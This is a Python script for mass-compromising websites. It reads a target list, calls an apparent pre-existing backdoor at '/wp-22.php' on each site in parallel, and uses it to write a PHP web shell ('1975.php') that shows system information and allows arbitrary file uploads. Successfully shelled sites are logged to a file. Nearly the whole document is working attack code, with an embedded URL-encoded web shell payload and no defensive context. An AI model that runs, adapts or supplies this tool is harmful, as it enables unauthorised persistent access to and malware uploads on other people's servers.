import requests ,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from multiprocessing import Pool


def Jiblia_hada( domain , name_shell , content_shell , find_name ):
	
	def saver_url( x , z ):
		with open( z , "a") as e:e.write("%s\n" % x )

	url = "{0}/wp-22.php".format( domain )
	
	veribals = "?sfilename={0}&sfilecontent={1}&supfiles={0}".format( name_shell , content_shell )
	
	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0",
						"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
							"Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate","Origin": domain,
								"Connection": "close",
									"Referer": url ,
										"Upgrade-Insecure-Requests": "1"}
	
	res = requests.get( "{0}{1}".format( url , veribals ) , headers=headers  , verify=False , timeout=7 ).text
	
	if "{}success".format( name_shell )  in res:
		
		new_url = "{0}/{1}?shell=1975".format( domain , name_shell )
		
		if find_name in requests.get( new_url , headers=headers  , verify=False , timeout=7 ).text :
			
			
			saver_url( new_url , "Uploaded_shell.txt" )
			print(">>>> Uploaded   ! %s " % domain )
		else:
			saver_url( url , "NO_Uploaded_shell.txt" )
			print(">> Not Uploaded   ! %s " % domain )
	else:
		print(">> Not VUL   ! %s " % domain )



def main( domain ):
	
	if ".php" in domain:
		domain = domain.split( "/")[2]
	else:
		pass

	if "://" not in domain:
		domain = "http://{}".format( domain )
	else:
		pass
			
	
	try:
		Jiblia_hada( domain , "1975.php", "%3Chtml%3E%0A%3Ctitle%3E%20deadcode1975%20%3C%2Ftitle%3E%0A%3Ccenter%3E%0A%09%3Ch1%3E%20deadcode1975%20%3C%2Fh1%3E%0A%3C%3Fphp%20echo%20%27%3Cb%3ESystem%20Info%3A%3C%2Fb%3E%20%27.php_uname%28%29.%27%3Cbr%3E%27.%27%3Cb%3ECurrent%20Directory%3A%3C%2Fb%3E%20%27.getcwd%28%29%3Becho%20%27%3Cbr%3E%3Cform%20method%3D%22post%22%20enctype%3D%22multipart%2Fform-data%22%20name%3D%22uploader%22%20id%3D%22uploader%22%3E%3Cinput%20type%3D%22file%22%20name%3D%22file%22%20size%3D%2220%22%3E%3Cinput%20name%3D%22_upl%22%20type%3D%22submit%22%20id%3D%22_upl%22%20value%3D%22Uploaded%22%3E%3C%2Fform%3E%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E%3C%2Fpre%3E%27%3Bif%28%24_FILES%29%7Bif%28%21empty%28%24_FILES%5B%27file%27%5D%29%29%7Bmove_uploaded_file%28%24_FILES%5B%27file%27%5D%5B%27tmp_name%27%5D%2C%24_FILES%5B%27file%27%5D%5B%27name%27%5D%29%3Becho%20%22%3Cb%3EFile%20Uploaded%20%21%21%21%3C%2Fb%3E%3Cbr%3E%22%3B%7Delse%7Becho%20%22%3Cb%3EUpload%20Failed%20%21%21%21%3C%2Fb%3E%3Cbr%3E%3Cbr%3E%22%3B%7D%7D%3F%3E%0A" , "deadcode1975" )
	except:
		pass


if __name__ == "__main__":
	our_list = open( input("Website: ") ,"r",encoding="utf-8").read().splitlines()
	
	ThreadPool = Pool( 20 )
	ThreadPool.map( main , our_list )
